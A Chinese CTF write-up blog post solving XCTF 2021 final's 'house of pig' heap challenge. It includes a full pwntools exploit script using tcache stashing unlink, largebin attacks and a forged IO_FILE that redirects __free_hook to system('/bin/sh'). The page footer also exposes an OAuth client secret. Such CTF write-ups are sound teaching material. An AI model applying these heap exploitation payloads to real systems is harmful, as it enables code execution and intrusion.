<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
  <title>
    
    house of pig xctf2021final复现 丨
    

    Whirling-In-Rags
  </title>

  
  <link rel="shortcut icon" href="/icon.svg">
  

  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
  
  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
  

  <!-- 字体 -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">

  
<link rel="stylesheet" href="/css/root.css">

  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/post.css">

<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Whirling-In-Rags" type="application/atom+xml">
</head>

  <body>
    <header class="header">
  <section class="header-container">
    <a class="logo" href="/">Whirling-In-Rags</a>
    <ul class="nav">
      
      <li><a href="/archives">archives</a></li>
      
      <li><a href="/tags">tags</a></li>
      
      <li><a href="/about">about</a></li>
      
    </ul>
  </section>
</header>
      
            <main class="main">
              <article class="post">
  
  <div class="post-title">house of pig xctf2021final复现</div>
  <div class="post-meta">
    <div class="date">2023 July 27th</div>
    <div class="tags">
      
      <a class="tag-item" href="/tags/pwn" style="color: #d1d5da;">pwn</a>
      
      <a class="tag-item" href="/tags/iofile" style="color: #d1d5da;">iofile</a>
      
      <a class="tag-item" href="/tags/wp" style="color: #d1d5da;">wp</a>
      
    </div>
  </div>
  

  <main class="post-content"><blockquote>
<p>阴间堆风水</p>
</blockquote>
<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="修复switch"><a href="#修复switch" class="headerlink" title="修复switch"></a>修复switch</h3><p>0: 0x3985 invalid</p>
<p>1: 0x3797 add</p>
<p>2: 0x37B3 show</p>
<p>3: 0x37cf edit</p>
<p>4: 0x37eb delet</p>
<p>5: 0x3807 change role</p>
<h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>通过add函数，猜测出heap_list，heap_size的作用，结合free、edit函数找到两个标志位</p>
<p>结合每个的大小与偏移，推测出数组的数量</p>
<pre><code class="c">struct house
&#123;
    char *list[0x18];
    int size[0x18];
    char flag1[0x18];
    char flag2[0x18];
&#125;;
</code></pre>
<pre><code class="c">struct tmp_house
&#123;
  struct house peppa_house;
  int current_peppasize;
  struct house mummy_house;
  int current_mummysize;
  struct house daddy_house;
  int current_daddysize;
  int show_time;
  int edit_time;
&#125;;
</code></pre>
<h3 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h3><ol>
<li>填充1个1和n个0,使信息长度为N*512+448(bit)</li>
<li>用64bit存储填充前信息长度，加在后面，长度变为(N+1)*512</li>
<li>装入标准的幻数: A&#x3D;0x67452301, B&#x3D;0xefcdab89, C&#x3D;0x98badcfe, D&#x3D;0x10325476</li>
<li>四轮循环运算，循环次数为分组个数(N+1)</li>
</ol>
<pre><code class="python">import hashlib
 
def main():
    start = &quot;3c4400&quot;
    while True:
        for i in range(100000000):
            s=&#39;A&#39;+str(i)
            #s=&#39;B&#39;+str(i)
            #s=&#39;C&#39;+str(i)
            print &quot;Test %s &quot; % s
            if hashlib.md5(s).hexdigest().startswith(start):
                print(s)
                return
 
if __name__ == &#39;__main__&#39;:
    main()
&#39;&#39;&#39;
A39275120
B3332073
C75929410
&#39;&#39;&#39;
</code></pre>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ul>
<li>add大小0x90~0x430，同一角色size只能增加</li>
<li>peppa 20次，mummy 10次，daddy 5次</li>
<li>peppa 0x30i, mummy 0x30i + 0x10, daddy 0x31i + 0x20</li>
<li>view 2次，edit 8次</li>
<li>delet后无法delet，切换角色可edit、view</li>
<li>daddy的add不用一直增加！</li>
<li>daddy add最后一次时会多calloc0xe8</li>
</ul>
<h2 id="堆风水"><a href="#堆风水" class="headerlink" title="堆风水"></a>堆风水</h2><h3 id="role的选择"><a href="#role的选择" class="headerlink" title="role的选择"></a>role的选择</h3><p>注意不同role的堆列表是独立的，同时不同role能修改的位置也不同</p>
<p>peppa可以修改fd,bk</p>
<p>mummy可以修改fd_nextsize,bk_nextsize</p>
<p>因而最好peppa打tcache stashing unlink, mummy打largebin attack</p>
<p>当然这不是绝对的，我们可以通过UAF达到对同一个堆块的混淆</p>
<h3 id="tcache-stashing-unlink"><a href="#tcache-stashing-unlink" class="headerlink" title="tcache stashing unlink"></a>tcache stashing unlink</h3><p>1.<code>tcache</code>中放<code>5</code>个，<code>smallbin</code>中放两个</p>
<p>2.将<strong>后进</strong><code>smallbin</code>的<code>chunk</code>的<code>bk</code>(不破坏<code>fd</code>指针的情况下)修改为<code>[target-0x10]</code>(即target为将要加入tchache的chunk的user pointer处），同时将目标地址<code>+0x08</code>处（即target-&gt;bk)的值设置为一个指向可写内存的指针。</p>
<p> 3.从smallbin中取一个chunk，走完stash流程，目标地址就会被链入tcache中。</p>
<h3 id="布局的问题"><a href="#布局的问题" class="headerlink" title="布局的问题"></a>布局的问题</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><blockquote>
<p> 在tcache中放了5个的情况下，如何使两个chunk进入<strong>相同大小</strong>的smallbin？</p>
</blockquote>
<p>问题转化为：如何使两个chunk进入相同大小的unsortedbin，而不进入tcache</p>
<p><img src="/../img/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0.assets/image-20230723173130250.png" alt="image-20230723173130250"></p>
<p>考虑当unsortedbin中只有一个chunk时，分配较小的chunk时会从其中切一块使用，另一块放入lastrmainder（同样是unsortedbin）</p>
<p>所以我们先获取一个较大的unsortedbin，（这一步通过填满tcache获得），随后malloc一块较小的chunk,就可以获得目标大小的unsortedbin</p>
<p>注意这里最后需要获得两块unsortedbin,注意避免在分配第二块时把第一块拿掉。我一开始分配的大小为0x150,刚好可以拿掉一个0xa0剩下一个0xa0,但是在分配第二快时就会出现问题</p>
<p>我的解决方案是，切割0x160的块，从中取出0xb0，刚好剩下0xa0,同时第二次取0xb0时不会出现把获得的unsortedbin取走的情况</p>
<p>网上的解决方案是：再填另一个tcache，两次用不同的unsortedbin切割，但是这种方法比较浪费次数</p>
<p>同时，经过计算、微调，我这里切下来的smallbin的fd和bk刚好位于chunk1-&gt;7,1-&gt;8的可写区域</p>
<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><blockquote>
<p>改到_IO_list_all的指针后，如何修改内容？</p>
</blockquote>
<p>本题比较阴间的地方是，不能完整地修改一个堆块</p>
<p>好在出题人给add3加了一个gift,可以申请一个0xe8的完整可写的堆块</p>
<p>所以最后可以把largebin attack指向的largebin留着，完成add3的最后一步，使得daddy从这个largechunk中切一块，从而直接获得完整的修改权限</p>
<p>下策是修改large chunk的chain指针，使其指向可写堆块</p>
<h3 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h3><pre><code class="python">#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import*

context(os = &#39;linux&#39;, arch = &#39;amd64&#39;, log_level = &#39;debug&#39;, terminal = [&#39;tmux&#39;, &#39;new-window&#39;])
def debug(cmd=&#39;&#39;):
    cmd += &quot;&quot;
    gdb.attach(p, cmd)
    pause()

host = &quot;&quot;
port = 0
p = process(&quot;./pig&quot;)
# libc=ELF(&quot;./libc.so.6&quot;)
#p = remote(host, port)

def add(size, content): #0xa0-0x430
    p.sendlineafter(&quot;Choice: &quot;, &quot;1&quot;)
    p.sendlineafter(&quot;size: &quot;, str(size).encode())
    p.sendafter(&quot;message: &quot;, content)
def view(index):
    p.sendlineafter(&quot;Choice: &quot;, &quot;2&quot;)
    p.sendlineafter(&quot;index: &quot;, str(index).encode())
def edit(index, content):
    p.sendlineafter(&quot;Choice: &quot;, &quot;3&quot;)
    p.sendlineafter(&quot;index: &quot;, str(index).encode())
    p.sendafter(&quot;message: &quot;, content)
def delet(index):
    p.sendlineafter(&quot;Choice: &quot;, &quot;4&quot;)
    p.sendlineafter(&quot;index: &quot;, str(index).encode())
def change(role):
    p.sendlineafter(&quot;Choice: &quot;, &quot;5&quot;)
    if role == 1:
        p.sendlineafter(&quot;user:\n&quot;, &quot;A39275120&quot;)
    elif role == 2:
        p.sendlineafter(&quot;user:\n&quot;, &quot;B3332073&quot;)
    elif role == 3:
        p.sendlineafter(&quot;user:\n&quot;, &quot;C75929410&quot;)

#tcache 0xa0
change(2)
add(0xa0, cyclic(0x30))
add(0xa0, cyclic(0x30))
add(0xa0, cyclic(0x30))
add(0xa0, cyclic(0x30))
add(0xa0, cyclic(0x30))#2-&gt;4

#unsortedbin-&gt;smallbin

#tcache 0x160
change(1)
add(0x160, cyclic(0x70))
add(0x160, cyclic(0x70))
add(0x160, cyclic(0x70))
add(0x160, cyclic(0x70))
add(0x160, cyclic(0x70))
add(0x160, cyclic(0x70))
add(0x160, cyclic(0x70))#1-&gt;6

add(0x160, cyclic(0x70))#1-&gt;7
change(2)
add(0xa0, cyclic(0x30))#protect 2-&gt;5
change(1)
add(0x160, cyclic(0x70))#1-&gt;8

#fill tcache 0x160
delet(0)
delet(1)
delet(2)
delet(3)
delet(4)
delet(5)
delet(6)

#fill tcache 0xa0 to 5
change(2)
delet(0)
delet(1)
delet(2)
delet(3)
delet(4)

#split into unsorted bin
change(1)
delet(7)

change(3)
change(1)#to clear flag0
view(7)#leak libc
libc_base = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))-0x219ce0
free_hook = libc_base + 0x2204a8
iolistall = libc_base + 0x21a680
memset_got = libc_base + 0x219188
log.success(&quot;libc_base = &#123;&#125;&quot;.format(hex(libc_base)))
log.success(&quot;free_hook = &#123;&#125;&quot;.format(hex(free_hook)))
log.success(&quot;iolistall = &#123;&#125;&quot;.format(hex(iolistall)))
log.success(&quot;memset_got = &#123;&#125;&quot;.format(hex(memset_got)))

change(3)
add(0xb0, cyclic(0x30))#smallbin 0 = 1-&gt;7	
change(1)
add(0x160, cyclic(0x70))#into smallbin 1-&gt;9
delet(8)
change(3)
add(0xb0, cyclic(0x30))#smallbin 1 = 1-&gt;8
#unsortedbin finished, 1-&gt;9(0x160);2-&gt;5(0xa0);3-&gt;1

#leak heap_base
change(1)
add(0x410, cyclic(0x160))#1-&gt;10
add(0x410, cyclic(0x160))#1-&gt;11
delet(10)
add(0x430, cyclic(0x160))#1-&gt;12
fixed_largebin_fd = libc_base + 0x21a0d0
change(2)
change(1)
payload = cyclic(0x160)
edit(10, payload)
view(10)
p.recvuntil(&quot;daaa&quot;)
heap_base = u64(p.recvn(6).ljust(8,b&quot;\x00&quot;))-0x13120
log.success(&quot;heap0_base = &#123;&#125;&quot;.format(hex(heap_base)))
#fix it
payload = p64(fixed_largebin_fd)*2 + cyclic(0x150)
edit(10, payload)
change(2)
add(0x410, cyclic(0x160))# 2-&gt;6 largebin1

#largebin attack
change(2)
add(0x410, cyclic(0x160))# 2-&gt;7 largebin2
change(1)
add(0x430, cyclic(0x160))# 1-&gt;13 protect
change(2)
add(0x410, cyclic(0x160))# 2-&gt;8 
change(1)
add(0x430, cyclic(0x160))# 1-&gt;14 protect
change(2)
add(0x420, cyclic(0x160))# 2-&gt;9 largebin3
change(1)
add(0x430, cyclic(0x160))# 1-&gt;15 protect

change(2)
delet(9)
change(1)
add(0x430, cyclic(0x160))# trigger largebin3 1-&gt;16

#largebin attack1
change(2)
delet(6)
payload = p64(heap_base+0x14e60) + p64(free_hook + 0x8-0x20)+cyclic(0x150)
edit(9, payload)

change(1)
add(0x430, cyclic(0x160))# trigger largebin1 1-&gt;17

change(3)
add(0x410, cyclic(0x160))# memsetgot-0x8 -&gt; 2-&gt;9   3-&gt;2

#fix largebin&amp;attck2
change(2)
delet(7)
payload = p64(heap_base+0x14e60) + p64(iolistall-0x20)+cyclic(0x150)
edit(9, payload)
change(1)
add(0x430, cyclic(0x160))# trigger largebin2 1-&gt;18 iolistall-&gt; 2-&gt;7
#fix largebin
change(2)
payload = p64(heap_base+0x14e60)*2+cyclic(0x150)
edit(7, payload)
payload = p64(heap_base+0x13da0)*2+cyclic(0x150)
edit(9, payload)

#tcache smashing unlink
change(3)
add(0x420, cyclic(0x160)) #2-9 calloced

change(1)
payload = cyclic(0x40) + p64(heap_base+0x12ce0) + p64(free_hook-0x10)+cyclic(0x110)
edit(8, payload)
change(3)

# debug()

add(0xa0, cyclic(0x30))   #3-&gt;4
#gift!
p.recvuntil(&quot;01dwang&#39;s Gift:\n&quot;)
#fake IOFILE
payload = &quot;&quot;
p.send(payload)

debug()


p.interactive()
</code></pre>
<h2 id="伪造IOFILE"><a href="#伪造IOFILE" class="headerlink" title="伪造IOFILE"></a>伪造IOFILE</h2><h3 id="改-free-hook做法"><a href="#改-free-hook做法" class="headerlink" title="改__free_hook做法"></a>改__free_hook做法</h3><pre><code class="c">int _IO_str_overflow (FILE *fp, int c)
&#123;
  int flush_only = c == EOF;
  size_t pos;
  if (fp-&gt;_flags &amp; _IO_NO_WRITES)
      return flush_only ? 0 : EOF;
  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
    &#123;
      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;
      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;
      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;
    &#125;
  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))
    &#123;
      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */
    return EOF;
      else
        &#123;
          char *new_buf;
          char *old_buf = fp-&gt;_IO_buf_base;
          size_t old_blen = _IO_blen (fp);
          size_t new_size = 2 * old_blen + 100;
          if (new_size &lt; old_blen)
            return EOF;
          new_buf = malloc (new_size); // 1
          if (new_buf == NULL)
            &#123;
              /*      __ferror(fp) = 1; */
              return EOF;
            &#125;
          if (old_buf)
            &#123;
              memcpy (new_buf, old_buf, old_blen); // 2
              free (old_buf); // 3
              /* Make sure _IO_setb won&#39;t try to delete _IO_buf_base. */
              fp-&gt;_IO_buf_base = NULL;
            &#125;
          memset (new_buf + old_blen, &#39;\0&#39;, new_size - old_blen); // 4
 
          _IO_setb (fp, new_buf, new_buf + new_size, 1);
          fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);
          fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);
          fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);
          fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);
 
          fp-&gt;_IO_write_base = new_buf;
          fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;
        &#125;
    &#125;
 
  if (!flush_only)
    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;
  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)
    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;
  return c;
&#125;
libc_hidden_def (_IO_str_overflow)
</code></pre>
<pre><code class="c">old_blen = _IO_blen (fp) = (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base
new_size = 2 * old_blen + 100
new_buf = malloc (new_size)

old_buf = fp-&gt;_IO_buf_base
memcpy (new_buf, old_buf, old_blen)

free (old_buf);

memset (new_buf + old_blen, &#39;\0&#39;, new_size - old_blen)
</code></pre>
<p>此时<code>_IO_list_all</code>指针已经指向了gift chunk,这个chunk的内容完全是可控的</p>
<p><img src="/../img/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0.assets/image-20230724133629983.png" alt="image-20230724133629983"></p>
<p>注意前面tcache stashing unlink改的位置，可能需要在__free_hook的地址处加减0x8，因为tcache申请会检查十六字节对齐</p>
<p>因为我没用原题的glibc,这里我对齐之后，0xe8大小的堆块不够写了，按照出题人的思路应该是刚好够写的</p>
<pre><code class="python">fake_IO_addr = heap_base+0x13da0
payload = p64(0)*3 + p64(0xffffffffffffffff) #write_ptr
payload += p64(0)#write_end # fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= _IO_buf_end - _IO_buf_base
payload += p64(fake_IO_addr+0xe0)#buf_base
payload += p64(fake_IO_addr+0xe0+0x1e) #buf_end
payload = payload.ljust(0xc8, b&#39;\x00&#39;)
payload += p64(libc_base+0x2166c0)
payload += b&#39;/bin/sh\x00&#39;+p64(0)+p64(libc_base+0x50d60)
</code></pre>
<h3 id="改memset-got做法"><a href="#改memset-got做法" class="headerlink" title="改memset got做法"></a>改memset got做法</h3><p>由于libc是partial RELRO，got表可写</p>
<p>因此可以把memset的got当作一个__free_hook</p>
<p>注意这里做tcache stashing unlink时不能直接覆盖memset的got表，这是因为calloc中会调用memset,如果这时的got已经进入tcache,则会变成加密后的fd，rip运行到这里时会报错</p>
<p>因而正确的做法应该是预留一定的空间，本题限制较大，故不做演示，仅提出思路</p>
</main>

  
    <div id="gitalk-container"></div> 

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<script type="text/javascript">

if(true){
	var gitalk = new Gitalk({
  	clientID: 'Ov23liOeINaDo82m26KW',
  	clientSecret: '40d0c404806ec19c706fad7b692aba1c3a281818',
  	repo: 'DeePunk42.github.io',
  	owner: 'DeePunk42',
  	admin: ['DeePunk42'],
  	id: 'Thu Jul 27 2023 11:17:56 GMT+0800',
  	distractionFreeMode: 'true'
})
gitalk.render('gitalk-container') 
}
</script>
    
</article>


<script src="/js/highlight.js"></script>

            </main>
            
              <footer class="footer">
  
  <span>Copyright © 2021 DeePunk</span>
  
</footer>
                
<script src="/js/theme.js"></script>

  </body>

</html>